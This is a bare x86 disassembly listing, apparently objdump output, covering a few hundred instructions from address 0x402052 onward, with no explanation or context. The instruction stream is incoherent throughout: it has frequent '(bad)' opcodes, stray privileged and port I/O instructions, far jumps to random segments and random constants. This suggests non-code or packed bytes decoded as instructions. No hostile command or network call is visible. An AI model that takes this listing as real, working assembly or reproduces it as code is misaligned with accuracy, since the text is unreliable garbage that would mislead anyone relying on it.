  402052:	dec    ecx
  402053:	in     eax,dx
  402054:	mov    esi,0x7f699e9f
  402059:	cmp    DWORD PTR [ecx-0x8],ebp
  40205c:	xor    eax,0xdd7cffd2
  402061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402062:	pop    ds
  402063:	mov    ah,0xf6
  402065:	ret    0x192c
  402068:	bound  edi,QWORD PTR [ecx]
  40206a:	fistp  DWORD PTR [ebx-0x35]
  40206d:	adc    eax,0x77d6c696
  402072:	std    
  402073:	sbb    ah,BYTE PTR [ecx-0xbed70dc]
  402079:	sbb    eax,0x526baba6
  40207e:	les    eax,FWORD PTR [edi-0x300bfc1a]
  402084:	sti    
  402085:	push   edx
  402086:	in     eax,dx
  402087:	in     al,0x61
  402089:	lock mov ecx,0x211b47c1
  40208f:	sub    al,0x52
  402091:	pop    esi
  402092:	popa   
  402093:	data16 add al,0x38
  402096:	(bad)  
  402098:	cli    
  402099:	idiv   BYTE PTR [edx+0x18e7ee02]
  40209f:	dec    ecx
  4020a0:	push   edi
  4020a1:	sub    DWORD PTR [edi],esp
  4020a3:	fadd   DWORD PTR [eax+edx*8]
  4020a6:	jle    0x40210e
  4020a8:	and    edi,DWORD PTR [edx-0x60d79481]
  4020ae:	int    0xd6
  4020b0:	mov    eax,0xa2845377
  4020b5:	aaa    
  4020b6:	or     bh,BYTE PTR [ebx-0x2b]
  4020b9:	and    BYTE PTR [edx],bl
  4020bb:	shl    DWORD PTR [esi],0x59
  4020be:	lea    edx,[ecx]
  4020c0:	pop    eax
  4020c1:	push   cs
  4020c2:	(bad)  
  4020c3:	cmp    eax,0x7af85218
  4020c8:	jmp    0x402112
  4020ca:	sbb    DWORD PTR [ecx+0x359cd211],edi
  4020d0:	mov    bl,0xb3
  4020d2:	jle    0x402076
  4020d4:	xor    edi,DWORD PTR [ebx-0x7627954b]
  4020da:	jbe    0x402136
  4020dc:	(bad)  
  4020dd:	into   
  4020de:	jo     0x40212a
  4020e0:	fnstsw WORD PTR [esi+0x6a9b74f2]
  4020e6:	pop    ds
  4020e7:	or     edx,DWORD PTR [ecx]
  4020e9:	test   eax,0x9c072618
  4020ee:	mov    esi,es
  4020f0:	lods   al,BYTE PTR ds:[esi]
  4020f1:	xor    ch,BYTE PTR [esi]
  4020f3:	xchg   esp,eax
  4020f4:	retf   0xe55e
  4020f7:	and    al,0xcf
  4020f9:	push   0x7d760921
  4020fe:	sub    BYTE PTR [ecx],0x5a
  402101:	sbb    ah,BYTE PTR [edi-0x22]
  402104:	cs mov ch,0xe2
  402107:	push   esp
  402108:	les    edi,FWORD PTR [eax-0x3d]
  40210b:	mov    ch,0xb2
  40210d:	inc    ebx
  40210e:	cmc    
  40210f:	mov    eax,ds:0x6d7f5509
  402114:	xchg   ecx,eax
  402115:	jge    0x40217c
  402117:	inc    esp
  402118:	xor    al,BYTE PTR [esi]
  40211a:	inc    edi
  40211b:	push   edi
  40211c:	call   DWORD PTR [eax-0x1311e649]
  402122:	ja     0x4020fd
  402124:	add    dl,BYTE PTR [esi]
  402126:	popf   
  402127:	cmc    
  402128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402129:	mov    eax,0x65caf5d1
  40212e:	in     eax,dx
  40212f:	imul   edx,DWORD PTR [eax],0xffffff8b
  402132:	leave  
  402133:	popa   
  402134:	sar    DWORD PTR [ebx],cl
  402136:	xor    cl,ch
  402138:	nop
  402139:	or     esp,esi
  40213b:	out    0xc2,al
  40213d:	xchg   edx,edx
  40213f:	loope  0x4020e4
  402141:	and    DWORD PTR [esi+0x0],edi
  402144:	add    dh,bl
  402146:	lods   al,BYTE PTR ds:[esi]
  402147:	(bad)  
  402148:	xor    edx,DWORD PTR [eax]
  40214a:	add    al,0x29
  40214c:	jle    0x4021b3
  40214e:	es (bad) 
  402150:	and    BYTE PTR [ebp+0x3ef5833],dh
  402156:	test   BYTE PTR [edx],dl
  402158:	mov    esp,DWORD PTR [eax+0x4471272c]
  40215e:	jp     0x402113
  402160:	cmp    esp,eax
  402162:	dec    eax
  402163:	inc    DWORD PTR [ebp-0x76e93e82]
  402169:	add    al,0xb1
  40216b:	lds    esp,FWORD PTR cs:[ebp+0x239d8595]
  402172:	and    eax,0x479127dc
  402177:	pushf  
  402178:	jge    0x402146
  40217a:	mov    esp,0xc35a0d3a
  40217f:	jge    0x402144
  402181:	push   esp
  402182:	pushf  
  402183:	shr    BYTE PTR [edi],cl
  402185:	or     esp,DWORD PTR [ebx-0x3e]
  402188:	sets   dl
  40218b:	pop    ds
  40218c:	sbb    BYTE PTR [esi-0x6d],dl
  40218f:	hlt    
  402190:	aaa    
  402191:	push   cs
  402192:	aad    0x4e
  402194:	les    ecx,FWORD PTR [ebp-0x61039d20]
  40219a:	jle    0x402140
  40219c:	sahf   
  40219d:	out    dx,al
  40219e:	imul   ecx,DWORD PTR [eax+0x3610f554],0xffffffbd
  4021a5:	push   ecx
  4021a6:	popf   
  4021a7:	add    eax,DWORD PTR [edi-0x18]
  4021aa:	mov    edi,0x23b42ed
  4021af:	mov    ecx,0x1079384b
  4021b4:	and    BYTE PTR [ebx+0x40],bl
  4021b7:	cmp    BYTE PTR [edx-0x2c],cl
  4021ba:	mov    al,ds:0x5339af9d
  4021bf:	or     eax,0x11037a98
  4021c4:	pop    eax
  4021c5:	pop    ss
  4021c6:	je     0x40218f
  4021c8:	inc    ebx
  4021c9:	jno    0x402152
  4021cb:	xor    DWORD PTR [ecx+eiz*1+0x4b3d8c07],edx
  4021d2:	push   0xc6b1a021
  4021d7:	test   edx,esp
  4021d9:	pop    es
  4021da:	out    0x13,ax
  4021dd:	inc    esi
  4021de:	cmp    esp,DWORD PTR [eax-0x76]
  4021e1:	xor    BYTE PTR ds:0x39940e84,al
  4021e7:	xchg   edx,eax
  4021e8:	lods   eax,DWORD PTR ds:[esi]
  4021e9:	adc    BYTE PTR [edx],ch
  4021eb:	nop
  4021ec:	xchg   ebx,eax
  4021ed:	mov    dl,0x80
  4021ef:	inc    ecx
  4021f0:	push   ecx
  4021f1:	or     DWORD PTR [ebp+0x390c278c],edx
  4021f7:	sbb    ebx,eax
  4021f9:	scas   al,BYTE PTR es:[edi]
  4021fa:	pop    ebp
  4021fb:	mov    bl,0x65
  4021fd:	jnp    0x4021b1
  4021ff:	aam    0xbf
  402201:	test   al,0x2
  402203:	sbb    cl,BYTE PTR ds:0x40d2eb20
  402209:	addr16 dec edx
  40220b:	adc    DWORD PTR [esi+0x358e23e8],esi
  402211:	cdq    
  402212:	and    eax,0xfa0bad41
  402217:	test   al,0x0
  402219:	xchg   esi,eax
  40221a:	dec    ebp
  40221b:	pop    ebp
  40221c:	call   0x8eaa69f2
  402221:	gs jne 0x4021c0
  402224:	outs   dx,BYTE PTR ds:[esi]
  402225:	add    BYTE PTR [edx-0x2c422695],0x3d
  40222c:	mov    ecx,0xab3b51e4
  402231:	in     eax,dx
  402232:	or     BYTE PTR [eax],bl
  402234:	sbb    ebp,ebx
  402236:	sbb    DWORD PTR [edi],eax
  402238:	jno    0x4021e1
  40223a:	push   0xffffff80
  40223c:	push   edx
  40223d:	lock and al,0x51
  402240:	shr    al,cl
  402242:	popf   
  402243:	fld    DWORD PTR [edi+0x7f]
  402246:	(bad)  
  402247:	loopne 0x4021fa
  402249:	mov    dl,0x89
  40224b:	jno    0x402273
  40224d:	test   DWORD PTR [esi],esi
  40224f:	std    
  402250:	lds    edi,FWORD PTR gs:[eax]
  402253:	iret   
  402254:	xlat   BYTE PTR ds:[ebx]
  402255:	xor    al,BYTE PTR [ecx+esi*1+0x54]
  402259:	inc    edx
  40225a:	mov    al,0x61
  40225c:	fsub   st,st(0)
  40225e:	mov    dh,0x71
  402260:	cmp    al,0xbd
  402262:	inc    esi
  402263:	fsub   QWORD PTR [edx+0x18]
  402266:	fistp  QWORD PTR [ebp+esi*1+0x53267642]
  40226d:	cmp    eax,edi
  40226f:	test   BYTE PTR gs:[edx+ecx*4],bl
  402273:	mov    al,ds:0x760621a7
  402278:	mov    fs,WORD PTR [edi+0x7f3770b1]
  40227e:	push   es
  40227f:	add    bh,ch
  402281:	and    DWORD PTR [ebx],esp
  402283:	mov    ebx,0x28a5177d
  402288:	and    bh,BYTE PTR [ebp-0x6b1e3696]
  40228e:	cs cs dec esp
  402291:	hlt    
  402292:	enter  0x3577,0xf2
  402296:	or     BYTE PTR [edi],0xa5
  402299:	push   ebp
  40229a:	shl    ebx,cl
  40229c:	cli    
  40229d:	pop    edx
  40229e:	dec    ebx
  40229f:	adc    edi,DWORD PTR [esi-0x2b]
  4022a2:	call   0x8466694b
  4022a7:	jae    0x402276
  4022a9:	inc    edi
  4022aa:	out    0xc6,al
  4022ac:	mov    dl,0xb1
  4022ae:	or     esi,DWORD PTR [eax]
  4022b0:	mov    ds:0xc37c518a,eax
  4022b5:	ds sahf 
  4022b7:	sti    
  4022b8:	push   ebp
  4022b9:	popa   
  4022ba:	sub    ah,bl
  4022bc:	clc    
  4022bd:	shl    dl,cl
  4022bf:	mov    ds:0xe9a9ee13,eax
  4022c4:	add    al,0xf8
  4022c6:	fs je  0x40230a
  4022c9:	push   es
  4022ca:	lock jmp 0x9da37f2d
  4022d0:	out    0x5c,eax
  4022d2:	pop    ebp
  4022d3:	xor    ebx,esi
  4022d5:	int3   
  4022d6:	test   eax,0x7d9a325b
  4022db:	popf   
  4022dc:	sbb    dl,al
  4022de:	or     eax,0x630a8b7b
  4022e3:	or     eax,0x2809adbe
  4022e8:	dec    edx
  4022e9:	(bad)  
  4022eb:	aam    0xf1
  4022ed:	sub    BYTE PTR [ecx-0x18d623f5],0xa6
  4022f4:	test   eax,0x5e619168
  4022f9:	xchg   esp,eax
  4022fa:	fsubp  st(7),st
  4022fc:	jp     0x40228f
  4022fe:	fsubr  DWORD PTR [ebx-0x1f]
  402301:	sbb    al,0x5d
  402303:	ss or  al,0x79
  402306:	cmc    
  402307:	cwde   
  402308:	jo     0x4022ef
  40230a:	xor    al,0x38
  40230c:	aaa    
  40230d:	mov    ah,0xaa
  40230f:	cvttps2pi mm4,xmm0
  402312:	or     al,0x2d
  402314:	clc    
  402315:	sar    DWORD PTR [ecx+0x1269e612],1
  40231b:	inc    ebx
  40231c:	jmp    0x402395
  40231e:	sbb    esp,DWORD PTR [eax+0x7c6356bd]
  402324:	mov    cl,0xa9
  402326:	dec    esi
  402327:	push   esi
  402328:	loop   0x402360
  40232a:	pop    ds
  40232b:	push   eax
  40232c:	in     al,dx
  40232d:	dec    edi
  40232e:	les    ebx,FWORD PTR gs:[esi-0x20]
  402332:	dec    esi
  402333:	ror    DWORD PTR [ecx+0x776efde3],cl
  402339:	retf   0x5525
  40233c:	sbb    edi,DWORD PTR [edx+0x5e1c910]
  402342:	int    0x24
  402344:	or     esi,ebp
  402346:	xor    edx,DWORD PTR [eax+0x16e24736]
  40234c:	rol    BYTE PTR [esp+0x55],1
  402350:	mov    ds:0x64f4d1de,al
  402355:	mov    al,ds:0xdefdbefe
  40235a:	rcr    DWORD PTR [esi-0x7],0xfa
  40235e:	mov    ecx,0x6f8c44fa
  402363:	mov    ch,0xa2
  402365:	sti    
  402366:	cwde   
  402367:	dec    ecx
  402368:	mov    dh,0xb0
  40236a:	je     0x402360
  40236c:	std    
  40236d:	enter  0xc3f2,0xb
  402371:	xchg   ebx,eax
  402372:	jo     0x40236a
  402374:	sbb    DWORD PTR [esi+ecx*8],ecx
  402377:	add    DWORD PTR ds:0xd61a80b4,0x5f
  40237e:	ss jne 0x4023e4
  402381:	popf   
  402382:	scas   eax,DWORD PTR es:[edi]
  402383:	les    edi,FWORD PTR [edx+ebx*8]
  402386:	sbb    al,0xb3
  402388:	push   esp
  402389:	ins    BYTE PTR es:[edi],dx
  40238a:	add    bh,BYTE PTR [edi]
  40238c:	add    DWORD PTR [eax+eax*2-0x19eb3b3e],eax
  402393:	pop    ebx
  402394:	mov    ds:0x68b1300c,al
  402399:	dec    esi
  40239a:	xor    BYTE PTR [edx+0x5495363f],ah
  4023a0:	inc    edx
  4023a1:	sub    BYTE PTR [esi],al
  4023a3:	push   DWORD PTR [ebp+eax*4-0x72]
  4023a7:	pop    ebx
  4023a8:	xchg   edi,eax
  4023a9:	fsubr  QWORD PTR [edi]
  4023ab:	sbb    BYTE PTR [edi+0x19],bl
  4023ae:	jmp    0x6640:0xfd9cc742
  4023b5:	push   ss
  4023b6:	ds cmc 
  4023b8:	xchg   ebx,eax
  4023b9:	adc    al,0xa0
  4023bb:	outs   dx,BYTE PTR ds:[esi]
  4023bc:	mov    bl,0xea
  4023be:	scas   eax,DWORD PTR es:[edi]
  4023bf:	and    eax,0x5e57fb93
  4023c4:	sbb    eax,0x86ad6f2e
  4023c9:	ret    0x5d1d
  4023cc:	adc    al,0x12
  4023ce:	mov    al,ds:0x473deef6
  4023d3:	je     0x402405
  4023d5:	scas   al,BYTE PTR es:[edi]
  4023d6:	icebp  
  4023d7:	dec    esi
  4023d8:	sbb    DWORD PTR [edi-0x2f064490],0xfd146ef5
  4023e2:	in     al,dx
  4023e3:	adc    ecx,DWORD PTR [ecx-0x10]
  4023e6:	out    0x4a,al
  4023e8:	fsub   QWORD PTR [edi]
  4023ea:	inc    eax
  4023eb:	cmp    eax,0x6251bac3
  4023f0:	xor    eax,0xffdf3f48
  4023f5:	dec    ecx
  4023f6:	inc    ebx
  4023f7:	jne    0x402432
  4023f9:	imul   esi,DWORD PTR [edx-0x56],0xffffff9c
  4023fd:	ror    DWORD PTR [ebp+0x64],cl
  402400:	push   ecx
  402401:	repz repz sbb eax,edi
  402405:	push   eax
  402406:	test   al,0xbc
  402408:	and    BYTE PTR [ebp+0x29],cl
  40240b:	and    edx,DWORD PTR [esi+0xf]
  40240e:	mov    ds:0xc43dc0c6,eax
  402413:	js     0x402463
  402415:	sbb    al,0xb1
  402417:	jp     0x4023bd
  402419:	jnp    0x40246f
  40241b:	jg     0x40248c
  40241d:	adc    DWORD PTR [eax-0x49],edi
  402420:	cmp    BYTE PTR [esi-0x5b],bh
  402423:	mov    bh,0xa3
  402425:	mov    ebp,0xd8ba0a4
  40242a:	popa   
  40242b:	mul    BYTE PTR [esi+0x4]
  40242e:	hlt    
  40242f:	dec    ebp
  402430:	imul   esi,eax,0xb9b4442a
  402436:	fnstsw WORD PTR [ebx-0x39]
  402439:	and    BYTE PTR [eax-0x53eb073d],ah
  40243f:	lods   al,BYTE PTR ds:[esi]
  402440:	aad    0x76
  402442:	retf   
  402443:	or     al,0xc6
  402445:	fdivr  DWORD PTR [ecx+0x7f0f5307]
  40244b:	inc    ebx
  40244c:	test   BYTE PTR [ecx-0xb88f4c3],ah
  402452:	add    DWORD PTR [edi],esi
  402454:	cmp    ch,BYTE PTR [edi+0x21]
  402457:	(bad)
  40245b:	addr16 retf 0x28
  40245f:	sbb    al,0xba
  402461:	stc    
  402462:	lds    ecx,FWORD PTR [edx+0x41]
  402465:	in     eax,0xbc
  402467:	ss jns 0x4024c7
  40246a:	pusha  
  40246b:	pop    es
  40246c:	cwde   
  40246d:	cmp    al,0xc7
  40246f:	nop
  402470:	adc    eax,DWORD PTR [edi-0x28]
  402473:	sub    eax,0x5bcf5d51
  402478:	ins    DWORD PTR es:[edi],dx
  402479:	inc    edi
  40247a:	jl     0x40242b
  40247c:	out    dx,al
  40247d:	sar    ecx,1
  40247f:	jmp    0x40244a
  402481:	cld    
  402482:	sbb    al,0x66
  402484:	and    eax,0x8f688f37
  402489:	retf   
  40248a:	jg     0x402503
  40248c:	pop    edi
  40248d:	iret   
  40248e:	sub    eax,0x54a8c3b2
  402493:	pop    esp
  402494:	gs cmp al,0xa4
  402497:	arpl   WORD PTR [eax],si
  402499:	ja     0x402500
  40249b:	inc    edx
  40249c:	mov    ds:0xdb2661da,eax
  4024a1:	nop
  4024a2:	sbb    al,0x33
  4024a4:	(bad)  
  4024a5:	push   es
  4024a6:	call   0x30e12346
  4024ab:	sbb    BYTE PTR [esi+0x1c],al
  4024ae:	ss pop ecx
  4024b0:	pop    ebx
  4024b1:	push   eax
  4024b2:	dec    edi
  4024b3:	push   ecx
  4024b4:	ds dec esi
  4024b6:	xchg   edx,eax
  4024b7:	lods   al,BYTE PTR ds:[esi]
  4024b8:	ja     0x402467
  4024ba:	(bad)  
  4024bb:	retf   0x8dbe
  4024be:	fsub   QWORD PTR [edx]
  4024c0:	rol    BYTE PTR [ebx-0x57],cl
  4024c3:	call   0x3dd3:0x14bdba79
  4024ca:	mov    esp,0x62aefd44
  4024cf:	jmp    0x40246e
  4024d1:	sar    DWORD PTR [ebp+0x1c40094b],cl
  4024d7:	ds stos BYTE PTR es:[edi],al
  4024d9:	add    al,0xb1
  4024db:	outs   dx,BYTE PTR ds:[esi]
  4024dc:	fmul   QWORD PTR [eax*1-0x429fa93]
  4024e3:	xchg   BYTE PTR ds:0xf7e0fb2e,dl
  4024e9:	cld    
  4024ea:	int3   
  4024eb:	sub    al,0x58
  4024ed:	inc    ecx
  4024ee:	(bad)  
  4024ef:	bound  esp,QWORD PTR [ebx+0x18]
  4024f2:	cmp    DWORD PTR ds:[esi-0x2df92761],ecx
  4024f9:	inc    ebx
  4024fa:	dec    ebp
  4024fb:	daa    
  4024fc:	xor    BYTE PTR [eax-0x4575094d],al
  402502:	fcomip st,st(6)
  402504:	repnz cmp cl,0xf9
  402508:	push   es
  402509:	pop    ebp
  40250a:	cmp    eax,0x3098e143
  40250f:	mov    bl,0xc7
  402511:	rcl    DWORD PTR [esi],0x96
  402514:	jo     0x402553
  402516:	loopne 0x40257d
  402518:	into   
  402519:	xchg   ebx,eax
  40251a:	lahf   
  40251b:	mov    esp,0x6081294c
  402520:	out    0x82,eax
  402522:	ds sti 
  402524:	add    al,0x4a
  402526:	pop    es
  402527:	into   
  402528:	in     al,dx
  402529:	push   ebx
  40252a:	jnp    0x402538
  40252c:	gs jle 0x402594
  40252f:	sbb    eax,0xe34aa0a2
  402534:	in     eax,dx
  402535:	sub    eax,0x236ab282
  40253a:	lods   eax,DWORD PTR ds:[esi]
  40253b:	rcl    DWORD PTR [edi-0x2e],0x98
  40253f:	cmp    al,0x6e
  402541:	dec    edx
  402542:	paddsw mm6,QWORD PTR [ebx+0x1e]
  402546:	dec    ebx
  402547:	adc    DWORD PTR [edi-0x3a],esi
  40254a:	add    BYTE PTR [edi+0x37],bh
  40254d:	and    BYTE PTR [ebx],ah
  40254f:	or     DWORD PTR gs:[ecx+0x7c0f58db],eax
  402556:	sbb    eax,0xf700899a
  40255b:	push   edi
  40255c:	in     al,0x3e
  40255e:	push   ds
  40255f:	mov    al,0x3c
  402561:	(bad)  
  402562:	fcomp  DWORD PTR [eax+esi*1]
  402565:	int    0xca
  402567:	hlt    
  402568:	cmp    dh,bl
  40256a:	aas    
  40256b:	bound  ebx,QWORD PTR ds:0x2f5ff3b0
  402571:	jg     0x4025b4
  402573:	mov    esp,0x5cf7c062
  402578:	push   edi
  402579:	out    0xae,eax
  40257b:	int    0x72
  40257d:	(bad)  
  40257e:	out    dx,al
  40257f:	ror    dl,cl
  402581:	stos   BYTE PTR es:[edi],al
  402582:	inc    eax
  402584:	jle    0x4025cc
  402586:	loop   0x402564
  402588:	test   BYTE PTR [ecx-0x1f],ch
  40258b:	cmp    al,cl
  40258d:	xchg   edx,eax
  40258e:	sub    edi,eax
  402590:	xor    edi,DWORD PTR [ebx+0x30]
  402593:	fwait
  402594:	pop    edi
  402595:	adc    bh,al
  402597:	into   
  402598:	ss stos BYTE PTR es:[edi],al
  40259a:	sbb    DWORD PTR ss:0xe3064ab2,edx
  4025a1:	pop    ebp
  4025a2:	xor    al,0x1e
  4025a4:	cld    
  4025a5:	lds    edx,FWORD PTR fs:[edi]
  4025a8:	xor    eax,DWORD PTR [eax+0x1b]
  4025ab:	pop    ebp
  4025ac:	mov    ds:0x9578ffda,eax
  4025b1:	inc    edx
  4025b2:	lahf   
  4025b3:	js     0x40258f
  4025b5:	mov    bl,0xc2
  4025b7:	xchg   ebx,eax
  4025b8:	or     eax,0x826bc253
  4025bd:	xlat   BYTE PTR ds:[ebx]
  4025bf:	push   es
  4025c0:	test   BYTE PTR ds:0x5f51b0da,dh
  4025c6:	mov    DWORD PTR [edx+esi*8+0x6c],esi
  4025ca:	sub    DWORD PTR [edi-0x27],0xc
  4025ce:	daa    
  4025cf:	stos   DWORD PTR es:[edi],eax
  4025d0:	int3   
  4025d1:	cdq    
  4025d2:	fstp   TBYTE PTR [esi+ebx*4-0x4e1e959f]
  4025d9:	enter  0x5334,0xe8
  4025dd:	xor    ebx,DWORD PTR [edx]
  4025df:	div    BYTE PTR [ebp+0xf6aa7de]
  4025e5:	and    al,0xad
  4025e7:	mov    ebx,0xbc7bd3e8
  4025ec:	in     eax,dx
  4025ed:	and    edi,DWORD PTR [edi+edi*8]
  4025f0:	out    dx,eax
  4025f1:	(bad)  
  4025f2:	test   al,0x60
  4025f4:	inc    edi
  4025f5:	sbb    bl,BYTE PTR [ebp+0x1e318940]
  4025fb:	mov    esp,0x940a0dde
  402600:	daa    
  402601:	retf   
  402602:	jge    0x402676
  402604:	test   dh,bl
  402606:	imul   edi,DWORD PTR [eax-0x28],0x6e
  40260a:	push   ecx
  40260b:	lds    edi,FWORD PTR [ecx-0x388f8e7d]
  402611:	aam    0xd1
  402613:	dec    edx
  402614:	push   DWORD PTR [esi+0x4f]
  402617:	fild   WORD PTR ss:[eax+0x79]
  40261b:	and    BYTE PTR [ecx],dh
  40261d:	(bad)  
  40261e:	push   ecx
  40261f:	xchg   esp,eax
  402620:	inc    esi
  402621:	int    0xd1
  402623:	js     0x402604
  402625:	inc    esi
  402626:	test   al,0x4c
  402628:	mov    ebx,fs
  40262a:	pop    ebp
  40262b:	shl    BYTE PTR [edi-0x11],cl
  40262e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40262f:	or     esi,DWORD PTR [ebx+0x712c4bbe]
  402635:	mov    bh,0x73
  402637:	cli    
  402638:	push   edx
  402639:	int    0xe7
  40263b:	out    0x14,eax
  40263d:	pop    eax
  40263e:	cli    
  40263f:	push   eax
  402640:	fdivr  QWORD PTR [ebx+ebp*1]
  402643:	jmp    0x402681
  402645:	loope  0x402619
  402647:	adc    BYTE PTR [ebp+0x12],bh
  40264a:	mov    ebp,0xfa285d6c
  40264f:	inc    ebx
  402650:	rcr    BYTE PTR [ebx-0x55],cl
  402653:	mov    al,0x5f
  402655:	push   es
  402656:	and    bh,BYTE PTR [ecx+0xb]
  402659:	inc    ebp
  40265a:	data16 mov al,ds:0xb9463608
  402660:	mov    ch,0xbb
  402662:	cs sub al,0x1e
  402665:	cmp    al,0xff
  402667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402668:	add    al,0x2e
  40266a:	pop    ds
  40266b:	out    dx,eax
  40266c:	leave  
  40266d:	sub    al,0xce
  402670:	ss fcmovnb st,st(2)
  402673:	xor    BYTE PTR [ebx-0x1a],dh
  402676:	xor    al,BYTE PTR [ecx]
  402678:	push   ebp
  402679:	pusha  
  40267a:	adc    eax,DWORD PTR [ecx+0x6f7255ad]
  402680:	addr16 and eax,0xe5f118a6
  402686:	sub    cl,cl
  402688:	push   ebp
  402689:	add    ecx,esp
  40268b:	ds ror bh,1
  40268e:	repz call 0x8709:0xcc776419
  402696:	mov    eax,ds:0x59000823
  40269b:	loopne 0x402690
  40269d:	loop   0x402697
  40269f:	sti    
  4026a0:	nop
  4026a1:	jmp    0x5059:0x13f553d2
  4026a8:	shr    BYTE PTR [ebx+eax*8],0xa
  4026ac:	xchg   ecx,eax
  4026ad:	rcr    BYTE PTR [ecx],cl
  4026af:	sti    
  4026b0:	and    bl,BYTE PTR [ebp-0x5fd050e5]
  4026b6:	int3   
  4026b7:	dec    ebp
  4026b8:	imul   eax,DWORD PTR [eax],0xb7b1e8bf
  4026be:	stos   DWORD PTR es:[edi],eax
  4026bf:	in     al,0x6d
  4026c1:	int    0xde
  4026c3:	xor    al,0x9d
  4026c5:	xor    BYTE PTR [ecx-0x3ce99216],cl
  4026cb:	es push es
  4026cd:	call   0xb1fa:0x12b81000
  4026d4:	clc    
  4026d5:	(bad)  
  4026d6:	ss dec esi
  4026d8:	idiv   bl
  4026da:	cs jl  0x4026bd
  4026dd:	loop   0x402726
  4026df:	(bad)  
  4026e0:	sub    al,0x93
  4026e2:	(bad)  [eax-0x9bd0802]
  4026e8:	fcomp  QWORD PTR [ecx+0x2e]
  4026eb:	or     BYTE PTR ds:0x19a27e1,al
  4026f1:	push   cs
  4026f2:	xor    al,0xac
  4026f4:	fs inc edx
  4026f6:	mov    ebp,0xa29dc7b4
  4026fb:	fisttp WORD PTR [ecx]
  4026fd:	adc    BYTE PTR [edi+eax*8],cl
  402700:	mov    al,ds:0xdf32f4dd
  402705:	fadd   st(1),st
  402707:	gs ret 
  402709:	(bad)  
  40270a:	call   0xceac:0xff471dbf
  402711:	or     eax,0x1ae4cf0f
  402716:	shl    BYTE PTR [esi],1
  402718:	rol    DWORD PTR [edx+0x4e],1
  40271b:	fist   DWORD PTR [ebp+0x7a]
  40271e:	sti    
  40271f:	out    dx,eax
  402720:	adc    eax,0x9413ea21
  402725:	fwait
  402726:	push   0xb9cdbefd
  40272b:	fxch   st(5)
  40272d:	popf   
  40272e:	pop    edx
  40272f:	rcr    DWORD PTR [edx-0x34],cl
  402732:	xchg   ebx,ebx
  402734:	inc    ebp
  402735:	bound  edi,QWORD PTR [edx+0x3375f9c0]
  40273b:	push   esp
  40273d:	stc    
  40273e:	push   ecx
  40273f:	aad    0xaa
  402741:	fwait
  402742:	mov    esp,0x4281ea04
  402748:	dec    eax
  402749:	arpl   bx,dx
  40274b:	push   ss
  40274c:	shr    edi,0x6
  40274f:	(bad)  
  402750:	and    al,0x93
  402752:	lahf   
  402753:	scas   eax,DWORD PTR es:[edi]
  402754:	mov    dh,0x23
  402756:	push   0x429743a1
  40275b:	push   edi
  40275c:	outs   dx,BYTE PTR ds:[esi]
  40275d:	shl    BYTE PTR [edx],0x44
  402760:	imul   edi,DWORD PTR [edi],0xa6d36711
  402766:	or     al,0x49
  402768:	es ret 0x3ff1
  40276c:	xor    bh,dh
  40276e:	fcomp  st(7)
  402770:	mov    ecx,esi
  402772:	sub    ecx,esi
  402774:	xlat   BYTE PTR ds:[ebx]
  402775:	sub    bl,BYTE PTR [ebx+0x36]
  402778:	inc    eax
  402779:	(bad)  
  40277b:	test   DWORD PTR [edx+0x78],0x61f791e6
  402782:	push   ds
  402783:	les    eax,FWORD PTR [eax+0x3c4b276f]
  402789:	es in  eax,dx
  40278b:	fs and al,0xd7
  40278e:	ds loopne 0x40278b
  402791:	out    dx,eax
  402792:	or     eax,0xa8d2b41
  402797:	pop    eax
  402798:	out    dx,al
  402799:	in     al,0x54
  40279b:	rcr    BYTE PTR [edx+0x25592dd0],0xc7
  4027a2:	xchg   edi,eax
  4027a3:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4027a5:	fidiv  WORD PTR [edi+0x1e]
  4027a8:	loopne 0x402749
  4027aa:	cmp    BYTE PTR [ebx+0xe134296],0x85
  4027b1:	or     edi,edx
  4027b3:	scas   eax,DWORD PTR es:[edi]
  4027b4:	xchg   DWORD PTR [ebp+0xa],ebx
  4027b7:	xchg   ebp,eax
  4027b8:	jge    0x402787
  4027ba:	dec    edi
  4027bb:	retf   0x2da9
  4027be:	es or  bl,bh
  4027c1:	cmp    ebx,DWORD PTR [ecx+0x2389cfb9]
  4027c7:	ds aam 0x54
  4027ca:	hlt    
  4027cb:	js     0x40281d
  4027cd:	mov    ds:0x8d393aaa,eax
  4027d2:	fmul   st,st(7)
  4027d4:	ficomp DWORD PTR [ebp+0x313baf72]
  4027da:	or     dl,ah
  4027dc:	inc    ecx
  4027dd:	or     dl,bl
  4027df:	lea    esi,[esi+0x16]
  4027e2:	call   0x477a5a1d
  4027e7:	mov    edx,0x4ec3df7c
  4027ec:	jle    0x4027ad
  4027ee:	les    ebx,FWORD PTR [ecx+0x73]
  4027f1:	xor    dh,BYTE PTR [ebp-0x305e5fcd]
  4027f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027f8:	and    eax,0x41d635c5
  4027fd:	or     BYTE PTR ds:0x97d45e58,dh
  402803:	mov    WORD PTR [ebx+eiz*8-0x25],?
  402807:	adc    eax,0x42456842
  40280c:	jmp    0x909aeb65
  402811:	arpl   si,bx
  402813:	push   es
  402814:	inc    ecx
  402815:	push   es
  402816:	mov    ch,0x37
  402818:	mov    esp,0x51f564b4
  40281d:	cmc    
  40281e:	pop    edx
  40281f:	test   edi,esi
  402821:	enter  0x6311,0x40
  402825:	sbb    cl,al
  402827:	sbb    DWORD PTR ds:0x5f45d38e,esp
  40282d:	enter  0xfea2,0xf
  402831:	pop    es
  402832:	push   cs
  402833:	and    edx,DWORD PTR [edi]
  402835:	mov    al,0x1
  402837:	mov    ?,WORD PTR gs:[esp+ebp*8-0x4f]
  40283c:	pusha  
  40283d:	sbb    ecx,DWORD PTR [edx+edx*4-0x44c229ff]
  402844:	into   
  402845:	adc    BYTE PTR [ebx],ch
  402847:	inc    esp
  402848:	jg     0x402880
  40284a:	pop    ebx
  40284b:	in     al,0x20
  40284d:	sbb    esp,0xffffffbc
  402850:	(bad)  
  402852:	aas    
  402853:	push   ebx
  402854:	sub    dh,BYTE PTR [eax]
  402856:	inc    edi
  402857:	jle    0x4027f4
  402859:	push   0xba9c5c3c
  40285e:	mov    al,0x42
  402860:	push   cs
  402861:	xor    ah,0xa7
  402864:	js     0x4027f4
  402866:	mov    bh,0x39
  402868:	and    al,0xcf
  40286a:	fmul   QWORD PTR [edx-0x696e60e2]
  402870:	and    ch,BYTE PTR [esi+0x4caa4527]
